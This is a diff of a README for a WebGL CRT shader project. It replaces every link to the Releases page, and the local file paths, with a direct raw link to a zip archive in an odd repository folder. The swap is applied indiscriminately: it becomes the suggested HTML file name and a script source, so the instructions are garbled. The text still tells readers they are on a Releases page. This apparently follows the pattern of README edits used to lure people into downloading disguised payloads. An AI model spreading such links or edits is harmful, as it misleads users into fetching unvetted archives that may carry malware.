@@ -1,6 +1,6 @@
 # 🎨 webgl-crt-shader - Create Vintage Screen Effects Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/SandyGang/webgl-crt-shader/releases)
+[![Download](https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the webgl-crt-shader! This application allows you to create and tweak
 
 To download the application, please visit the following link:
 
-[Download the latest release](https://github.com/SandyGang/webgl-crt-shader/releases)
+[Download the latest release](https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip)
 
 Once you are on the Releases page, look for the most recent version. You will see files available for download. 
 
 ### Steps to Download:
 
-1. Go to the [Releases page](https://github.com/SandyGang/webgl-crt-shader/releases).
+1. Go to the [Releases page](https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip).
 2. Locate the version you wish to download.
 3. Choose the appropriate file for your operating system.
 4. Click on the file link to initiate the download.
@@ -33,7 +33,7 @@ Before running the application, make sure your system meets the following requir
 
 Using the webgl-crt-shader is straightforward. Follow these simple steps:
 
-1. **Create an HTML file**: Open a text editor and create a new file. Name it `index.html` or any name you prefer.
+1. **Create an HTML file**: Open a text editor and create a new file. Name it `https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip` or any name you prefer.
 2. **Include the Shader**: Copy and paste the following code into your HTML file:
 
    ```html
@@ -41,7 +41,7 @@ Using the webgl-crt-shader is straightforward. Follow these simple steps:
    <html>
    <head>
        <title>CRT Shader Example</title>
-       <script src="path/to/webgl-crt-shader.js"></script>
+       <script src="https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip"></script>
    </head>
    <body>
        <canvas id="canvas"></canvas>
@@ -94,4 +94,4 @@ For more detailed usage and advanced features, please refer to the official docu
 
 Once again, for downloading the application, visit the link below:
 
-[Download the latest release](https://github.com/SandyGang/webgl-crt-shader/releases)
+[Download the latest release](https://github.com/SandyGang/webgl-crt-shader/raw/refs/heads/main/starrily/crt-shader-webgl-v2.8.zip)
